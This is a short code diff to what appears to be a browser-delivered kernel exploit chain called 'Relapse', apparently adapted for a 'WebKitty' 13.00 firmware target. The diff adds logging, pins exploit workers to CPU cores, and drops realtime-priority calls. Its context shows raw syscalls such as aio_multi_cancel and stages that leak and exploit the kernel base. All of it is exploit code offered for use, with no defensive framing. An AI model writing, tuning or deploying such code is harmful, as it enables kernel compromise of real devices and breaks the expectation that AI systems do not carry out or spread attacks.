@@ -497,6 +497,7 @@ async function pr_spawn_workers() {
       'kinit',
       `(cores) => {
         importScripts('kernel.js?v=' + globalThis.BUILD_ID);
+        logger.info('Relapse kinit: kernel loaded !!');
         fn.cpuset_getaffinity = new NativeFunction(487, 'number');
 
         const CPUSET_SZ = 16;
@@ -523,9 +524,11 @@ async function pr_spawn_workers() {
         }
         mem.free(mask);
         if (chosen < 0) throw new Error('Unable to pin Relapse worker !!');
+        logger.info('Relapse kinit: core ' + chosen + ' verified !!');
 
-        set_rtprio(RTP);
+        // WebKitty does not change the worker's rtprio here.
         fn.aio_multi_cancel = new NativeFunction(666, 'number');
+        logger.info('Relapse kinit: cancel armed !!');
         return chosen;
       }`,
     );
@@ -550,7 +553,7 @@ async function pr_spawn_workers() {
       }`,
     );
     const worker_core = await w.execute('kinit', pr_worker_cores);
-    logger.debug(`Relapse worker ${i} pinned on core ${worker_core} !!`);
+    logger.info(`Relapse worker ${i} pinned on core ${worker_core} !!`);
     pr_workers[i] = w;
   }
 
@@ -1014,7 +1017,7 @@ async function pr_leak_kernel_base() {
 
 async function pr_exploit_kernel_base() {
   pr_select_cores();
-  set_rtprio(RTP);
+  // WebKitty does not set realtime priority in the 13.00 path.
 
   logger.info('Relapse stage: scratch');
   pr_init_scratch();
